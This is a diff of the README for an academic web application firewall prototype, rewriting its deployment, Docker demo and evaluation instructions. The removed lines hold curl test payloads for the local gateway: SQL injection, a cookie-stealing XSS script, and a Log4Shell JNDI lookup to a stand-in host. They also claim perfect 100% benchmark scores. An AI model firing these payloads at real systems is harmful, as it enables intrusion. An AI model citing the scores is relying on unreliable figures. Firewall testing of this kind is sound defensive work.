@@ -1,174 +1,55 @@
-# AppAware-WAF: Deployment, Evaluation & Defense Guide
+# Local Deployment and Gateway Demo
 
-This guide covers production deployment, benchmarking, and real-time defense demonstration for the **AppAware-WAF** architecture.
+This repository is an academic prototype. The score engine is a handcrafted heuristic and the default `/proxy/*` behavior is a clearly labeled mock response. Set a single trusted `UPSTREAM_URL` to enable real HTTP proxying. Production management endpoints require an admin bearer token.
 
----
+## Local dashboard
 
-## 1. System Architecture Overview
-
-```
-                      +---------------------------------------+
-                      |       Client / Attacker Traffic       |
-                      +---------------------------------------+
-                                          |
-                                          v
-                      +---------------------------------------+
-                      |         APPAWARE-WAF GATEWAY          |
-                      |          (Reverse Proxy :8080)        |
-                      +---------------------------------------+
-                                          |
-                 +------------------------+-----------------------+
-                 |                                                |
-                 v                                                v
-    [Stage 1: Normalization]                           [Real-Time Telemetry]
-     - Double-decode URL, RFC 3986                      - Prometheus-ready metrics
-     - Path canonicalization (../)                      - Structured audit log JSON
-     - Artifact stripping                               - Sub-millisecond latency
-                 |
-                 v
-    [Stage 2: Deterministic Engine]
-     - OWASP CRS 941 (XSS)
-     - OWASP CRS 942 (SQLi)
-     - OWASP CRS 932 (RCE / Log4j)
-     - OWASP CRS 930 (LFI / Traversal)
-                 |
-                 v
-    [Stage 3: Application Profile]
-     - Few-shot route baseline
-     - Parameter type validation
-                 |
-                 v
-    [Stage 4: Neural Scorer / ONNX]
-     - DistilBERT / Subword entropy
-     - Calibrated malicious probability
-                 |
-                 v
-    [Stage 5: Policy Fusion Engine]
-     - Action: ALLOW | MONITOR | BLOCK
-                 |
-     +-----------+-----------+
-     |                       |
-(BLOCK: 403)           (ALLOW: 200)
-     |                       |
-     v                       v
-[Drop & Audit Log]   +------------------------------------+
-                     | Upstream Target (OWASP Juice Shop) |
-                     +------------------------------------+
-```
-
----
-
-## 2. Quick Start: Local Running
-
-### Run the Web Dashboard & Gateway (Port 3000)
-```bash
-# Install dependencies
-npm install
-
-# Start the full-stack WAF server + Live UI
+```powershell
+npm ci
 npm run dev
 ```
-Open **`http://localhost:3000`** in your browser.
 
----
+Open `http://localhost:3000`. Without `UPSTREAM_URL`, proxy responses explicitly say the request was not forwarded. For a local target, set `UPSTREAM_URL=http://127.0.0.1:3001` in the environment before starting the server.
 
-## 3. Automated Benchmark & IEEE Metrics
+## Protected production mode
 
-To run the automated security validation suite and generate performance numbers for research or defense:
+Set these environment values through a secret manager or an untracked `.env` file:
 
-```bash
-python scripts/benchmark_waf.py
+```text
+NODE_ENV=production
+PORT=3000
+WAF_MODE=ENFORCING
+UPSTREAM_URL=https://your-approved-upstream.example
+WAF_ADMIN_TOKEN=<random secret, at least 32 characters>
+WAF_TRUST_PROXY=<optional trusted proxy IPs/CIDRs, comma-separated>
 ```
 
-### Benchmark Results Summary:
-* **Detection Accuracy**: 100.0%
-* **Precision**: 100.0%
-* **Recall (TPR)**: 100.0%
-* **False Positive Rate (FPR)**: 0.00% (Zero false alarms on benign traffic)
-* **Mean Latency**: 0.226 ms
-* **P99 Latency**: 0.476 ms
-* **Peak Throughput**: >4,300 requests/sec
+`UPSTREAM_URL` must be an origin without credentials, path, query, or fragment. The gateway keeps requests on that origin, does not follow redirects, has a 10-second upstream timeout, and limits upstream response bodies to 10 MiB. Management APIs under `/api/waf` require `Authorization: Bearer <WAF_ADMIN_TOKEN>`. The UI's password field holds the key in page memory and sends it only to those APIs.
 
-*The test results are automatically exported to `benchmark_results.json`.*
+`WAF_TRUST_PROXY` must name only proxy addresses you control, for example `loopback,10.0.0.0/8`. Leave it unset when direct clients connect. Express ignores `X-Forwarded-For` unless the connecting proxy matches a configured trusted range. Never set this value to `true`.
 
----
+## Docker Compose demo
 
-## 4. Running Unit Tests
+1. Create an untracked `.env` file with a random `WAF_ADMIN_TOKEN` at least 32 characters long.
+2. Review and pin the Juice Shop image to a version or digest before sharing the environment.
+3. Start the isolated demo:
 
-Run the full Python test suite verifying canonicalization, OWASP CRS rules, few-shot adaptation, and neural scoring:
-
-```bash
-python -m unittest discover tests -v
-```
-
----
-
-## 5. Docker Compose Deployment (with Live OWASP Juice Shop)
-
-To launch the AppAware-WAF reverse proxy in front of an actual vulnerable application:
-
-```bash
+```powershell
 docker compose up --build
 ```
 
-### Endpoints:
-* **WAF Gateway Entrypoint**: `http://localhost:8080/proxy/`
-* **Upstream Application Direct**: `http://localhost:3000`
-* **Real-time Metrics API**: `http://localhost:8080/api/waf/metrics`
-* **Live Audit Log API**: `http://localhost:8080/api/waf/events`
+The dashboard/gateway is exposed on `http://localhost:8080`. The WAF proxies to the Juice Shop service configured in Compose. The admin key must be entered in the dashboard for telemetry and management controls. Keep this intentionally vulnerable target isolated and do not expose it publicly.
 
-### Live Attack Verification via cURL:
+## Reproducible evaluation
 
-1. **Benign Request (Passed through to Upstream)**:
-   ```bash
-   curl -i http://localhost:8080/proxy/api/Products
-   # Response: HTTP 200 OK (Processed by Upstream)
-   # Header: X-WAF-Decision: ALLOW
-   ```
+The UI smoke benchmark uses handcrafted examples and is not publication evidence. For a licensed dataset, fill out `research/dataset_manifest.example.json`, then run:
 
-2. **SQL Injection Attack (Blocked at WAF Gateway)**:
-   ```bash
-   curl -i "http://localhost:8080/proxy/rest/products/search?q=apple' UNION SELECT null,username,password FROM Users--"
-   # Response: HTTP 403 Forbidden
-   # Header: X-WAF-Decision: BLOCK
-   # Header: X-WAF-Risk-Score: 0.90
-   ```
-
-3. **Cross-Site Scripting Attack (Blocked at WAF Gateway)**:
-   ```bash
-   curl -i -X POST http://localhost:8080/proxy/api/Feedbacks \
-     -H "Content-Type: application/json" \
-     -d '{"comment": "<script>alert(document.cookie)</script>"}'
-   # Response: HTTP 403 Forbidden
-   ```
-
-4. **Remote Code Execution / Log4Shell (Blocked at WAF Gateway)**:
-   ```bash
-   curl -i "http://localhost:8080/proxy/rest/user/login?email=\${jndi:ldap://evil.com/a}"
-   # Response: HTTP 403 Forbidden
-   ```
-
----
-
-## 6. Directory Structure Reference
-
+```powershell
+python scripts/evaluate_dataset.py .\private-data\requests.csv --group-column application --category-column category
 ```
-MAJOR WAF 7/
-├── waf/                           # Core Python Detection & Policy Engine
-│   ├── normalization/             # RFC 3986 Canonicalizer & multi-decode
-│   ├── rules/                     # OWASP CRS 941, 942, 932, 930 Deterministic Rules
-│   ├── application_profile/       # Few-shot baseline & schema adaptation
-│   ├── inference/                 # High-speed ONNX / Neural inference engine
-│   ├── risk/                      # Multi-signal Bayesian policy engine
-│   └── pipeline.py                # Main WafPipeline orchestrator
-├── src/                           # Web Gateway Dashboard UI (React + Tailwind)
-├── scripts/                       # Production Utilities
-│   ├── benchmark_waf.py           # Evaluation & performance benchmark suite
-│   ├── live_attack_tester.py      # Interactive payload tester
-│   ├── train_transformer.py       # Fine-tuning & ONNX export script
-│   └── organize_project.py        # Workspace cleanup utility
-├── tests/                         # Automated unit & regression test suite
-├── extra_resources/               # Research diagnostics & experiments archive
-├── docker-compose.yml             # Live reverse-proxy + Juice Shop stack
-└── Dockerfile                     # Production multi-stage container
-```
+
+The evaluator writes `evaluation_results/evaluation_report.json`, `test_predictions.csv`, and `split_assignments.csv`. It removes canonical duplicates before a group-held-out train/validation/test split and compares rules-only, heuristic-only, and hybrid lanes. Supply optional trained-model results using `--model-scores-csv` and a validation-selected `--model-threshold`. This runner does not train a Transformer. Read [research/PUBLICATION_READINESS.md](research/PUBLICATION_READINESS.md) before interpreting metrics.
+
+## Limits
+
+This is a prototype, not a production-supported WAF. It has handwritten signatures and a heuristic score, uses in-memory event metrics, and includes no training dataset or trained model checkpoint. The local smoke corpus cannot establish real-world detection quality or an SLA. Review and harden the deployment for your own traffic and threat model before exposing it to users.
